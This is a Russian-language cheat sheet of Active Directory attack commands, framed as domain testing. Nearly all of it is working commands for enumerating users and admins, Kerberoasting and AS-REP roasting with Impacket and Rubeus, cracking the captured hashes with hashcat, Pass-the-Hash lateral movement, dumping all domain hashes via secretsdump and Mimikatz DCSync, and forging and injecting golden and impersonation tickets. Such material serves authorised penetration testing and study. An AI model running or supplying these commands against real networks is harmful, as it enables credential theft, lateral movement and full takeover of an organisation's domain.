# Перечисление и атаки на учетные данные

Команды для тестирования Active Directory: перечисление ресурсов домена, Kerberoasting, AS-REP roasting, передача хэша (Pass-the-Hash), DCSync, а также использование поддельных или повторно использованных тикетов.

## Active Directory и Kerberos — Шпаргалка

**Что такое Active Directory?**

Active Directory — это платформа управления идентификацией и политиками Microsoft для доменов Windows. Ее тикеты Kerberos, разрешения каталога и отношения доверия создают векторы, которые можно проанализировать и оценить, получив первоначальный доступ (плацдарм) в домене.

Замените `domain.com`, примеры идентификаторов, `192.0.2.20` и значения хэшей или тикетов в верхнем регистре на соответствующие данные вашего домена. Примеры с Impacket предполагают, что указанные скрипты доступны локально; команды Rubeus и Mimikatz выполняются из каталога с их исполняемыми файлами. Анонимные поисковые запросы LDAP могут быть запрещены, а для командлетов AD PowerShell требуется модуль ActiveDirectory. Репликация, имперсонация тикетов и удаленное выполнение команд требуют соответствующих разрешений учетной записи и правильной конфигурации целевой системы.

Перечислить всех пользователей домена

```
net user /domain
```

Перечислить участников группы Domain Admins (Администраторы домена)

```
net group "Domain Admins" /domain
```

Перечислить контроллеры домена

```
nltest /dclist:<domain>
```

PowerShell: перечислить всех пользователей AD

```
Get-ADUser -Filter * -Properties * | Select Name,SamAccountName,Enabled
```

PowerShell: участники группы Domain Admins

```
Get-ADGroupMember "Domain Admins" | Select Name,SamAccountName
```

Перечисление пользователей по LDAP

```
ldapsearch -H ldap://<DC_IP> -x -b "dc=domain,dc=com" "(objectClass=user)" sAMAccountName
```

Сбор данных BloodHound

```
bloodhound-python -u user -p pass -d domain.com -c All --zip
```

Если приведенная выше команда не сработает, укажите контроллер домена и DNS-сервер явно. Замените `DC01.domain.com` и `<DC_IP>` на имя хоста и IP-адрес вашего контроллера домена.

Сбор данных BloodHound: явное указание контроллера домена (DC) и DNS

```
bloodhound-python -u 'user' -p 'password' -d domain.com -dc DC01.domain.com -ns <DC_IP> -c All --zip
```

Impacket: получение хэшей TGS

```
python3 GetUserSPNs.py domain.com/user:password -dc-ip <DC_IP> -request
```

Windows: Kerberoasting всех SPN

```
Rubeus.exe kerberoast /outfile:hashes.txt
```

Взлом хэшей TGS-REP в автономном режиме (офлайн)

```
hashcat -m 13100 -a 0 hashes.txt rockyou.txt
```

Получение AS-REP для учетных записей без предварительной аутентификации

```
python3 GetNPUsers.py domain.com/ -dc-ip <DC_IP> -usersfile users.txt -no-pass
```

AS-REP roasting в Windows

```
Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

Взлом хэшей AS-REP

```
hashcat -m 18200 -a 0 asrep_hashes.txt rockyou.txt
```

Impacket: Pass-the-Hash с помощью psexec

```
python3 psexec.py -hashes :NTLM_HASH domain/user@target
```

CrackMapExec: Pass-the-Hash (PtH) по SMB
```
crackmapexec smb target -u user -H NTLM_HASH
```

Impacket: Pass-the-Hash с помощью WMI exec

```
python3 wmiexec.py -hashes :NTLM_HASH domain/user@target
```

Снять дамп всех хэшей домена

```
python3 secretsdump.py domain/user:pass@<DC_IP>
```

DCSync: получение хэша KRBTGT

```
mimikatz # lsadump::dcsync /domain:domain.com /user:krbtgt
```

Создание и внедрение золотого билета

```
mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:<SID> /krbtgt:<NTLM> /ptt
```

Внедрение существующего тикета

```
mimikatz # kerberos::ptt ticket.kirbi
```

Внедрение тикета в текущую сессию

```
Rubeus.exe ptt /ticket:<base64_ticket>
```

Получение тикета службы
```
python3 getST.py -spn cifs/<target> -impersonate Administrator domain.com/user:pass
```
